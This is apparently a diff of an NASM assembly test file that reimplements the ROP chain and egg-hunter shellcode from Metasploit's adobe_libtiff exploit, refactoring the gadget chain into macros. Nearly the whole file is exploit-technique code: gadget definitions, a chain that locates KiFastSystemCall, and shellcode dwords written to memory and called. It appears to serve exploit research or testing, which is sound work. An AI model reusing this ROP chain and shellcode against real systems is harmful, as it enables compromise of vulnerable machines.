@@ -2,54 +2,84 @@
 ; from http://www.metasploit.com/redmine/projects/framework/repository/entry/modules/exploits/windows/fileformat/adobe_libtiff.rb
 
 %include '../../onesec.hdr'
-res dt 0
+
+_KiFastSystemCall equ 07ffe0300h
+
 EntryPoint:
-    push trampo
-        pop esp
+    mov esp, trampo
     retn
+
+align 16, int3
 
 _pop_eax__ret:
     pop eax
     ret
 
+align 16, int3
+
 _pop_ecx__ret:
     pop ecx
     ret
+
+align 16, int3
 
 _mov_eax_mECX__ret:
     mov eax, [ecx]
     ret
 
+align 16, int3
+
 _mov_mEAX_ECX__ret:
     mov [eax], ecx
     ret
+
+align 16, int3
 
 _mov_mECX_eax__xor_eax_eax__ret:
     mov [ecx], eax
     xor eax, eax
     ret
 
+align 16, int3
+
 _call_mEAX__ret_:
     call [eax]
     ret
+
+align 16, int3
 
 pop_esi__add_esp_14__ret:
     pop esi
     add esp, 14h
     ret
 
+align 16, int3
+
 _mov_eax_m_ebp_24h__ret:
     mov eax, [ebp - 24h]
     ret
+
+align 16, int3
 
 _add_eax_4__ret:
     add eax, 4
     ret
 
+align 16, int3
+
 _call_eax_:
     call eax
 
-_KiFastSystemCall equ 07ffe0300h
+align 16, int3
+
+%include '..\goodbad.inc'
+
+align 16, int3
+
+;%IMPORT user32.dll!MessageBoxA
+;%IMPORT kernel32.dll!ExitProcess
+
+align 16, int3
 
 %macro mov_eax 1
     dd _pop_eax__ret, %1
@@ -70,31 +100,41 @@ _KiFastSystemCall equ 07ffe0300h
     dd _mov_eax_mECX__ret
 %endmacro
 
+%macro mov_mEAX_imm 1
+    mov_ecx %1
+    dd _mov_mEAX_ECX__ret
+%endmacro
+
+%macro MOVSD_ 1
+    mov_mEAX_imm %1
+    dd _add_eax_4__ret
+%endmacro
+
 trampo:
+    mov_mem 010104h, 01000h         ; dd _pop_eax__ret,
+                                    ; dd 010104h,
+                                    ; dd _pop_ecx__ret,
+                                    ; dd 01000h,
+                                    ; dd _mov_mEAX_ECX__ret,
+    mov_eax_mem _KiFastSystemCall   ; dd _pop_ecx__ret,
+                                    ; dd _KiFastSystemCall,
+                                    ; dd _mov_eax_mECX__ret,
 
-    mov_mem 010104h, 01000h
-    mov_eax_mem _KiFastSystemCall
+    mov_ecx 010011h                 ; dd _pop_ecx__ret,
+                                    ; dd 010011h,
 
-
-    dd _pop_eax__ret,
-    dd 010104h,
-    dd _pop_ecx__ret,
-    dd 01000h,
-    dd _mov_mEAX_ECX__ret,
-
-    dd _pop_ecx__ret,
-    dd _KiFastSystemCall,
-    dd _mov_eax_mECX__ret,
-
-    dd _pop_ecx__ret,
-    dd 010011h,
     dd _mov_mECX_eax__xor_eax_eax__ret,
-    dd _pop_ecx__ret,
-    dd 010100h,
+
+    mov_ecx 010100h                 ; dd _pop_ecx__ret,
+                                    ; dd 010100h,
+
     dd _mov_mECX_eax__xor_eax_eax__ret,
-    dd _pop_eax__ret,
-    dd 010011h,
+
+    mov_eax 010011h                 ; dd _pop_eax__ret,
+                                    ; dd 010011h,
+
     dd _call_mEAX__ret_,
+
     dd pop_esi__add_esp_14__ret,
     dd 0ffffffffh,
     dd 010100h,
@@ -109,62 +149,23 @@ trampo:
     ; \x00\x8b\xfa\xaf\x75\xea\x87\xfe\xeb\x0a\x5f\xb9\xe0\x03\x00\x00
     ; \xf3\xa5\xeb\x09\xe8\xf1\xff\xff\xff\x90\x90\x90\xff\xff\xff\x90
     dd _mov_eax_m_ebp_24h__ret,
-    dd _pop_ecx__ret,
-    dd 026a525ah,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 03c2ecd58h,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 0f4745a05h,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 02a4949b8h,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 0affa8b00h,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 0fe87ea75h,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 0b95f0aebh,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 03e0h,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 09eba5f3h,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 0fffff1e8h,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 0909090ffh,
-    dd _mov_mEAX_ECX__ret,
-    dd _add_eax_4__ret,
-    dd _pop_ecx__ret,
-    dd 090ffffffh,
-    dd _mov_mEAX_ECX__ret,
-    dd _mov_eax_m_ebp_24h__ret,
-    dd _call_eax_,
 
+    MOVSD_ 0026a525ah
+    MOVSD_ 03c2ecd58h
+    MOVSD_ 0f4745a05h
+    MOVSD_ 02a4949b8h
+    MOVSD_ 0affa8b00h
+    MOVSD_ 0fe87ea75h
+    MOVSD_ 0b95f0aebh
+    MOVSD_ 0000003e0h
+    MOVSD_ 009eba5f3h
+    MOVSD_ 0fffff1e8h
+    MOVSD_ 0909090ffh
 
-    jmp good
-%include '..\goodbad.inc'
+    mov_mEAX_imm 090ffffffh,
 
-;%IMPORT user32.dll!MessageBoxA
-;%IMPORT kernel32.dll!ExitProcess
+    dd _mov_eax_m_ebp_24h__ret
+    dd _call_eax_
 
 ;%IMPORTS
 
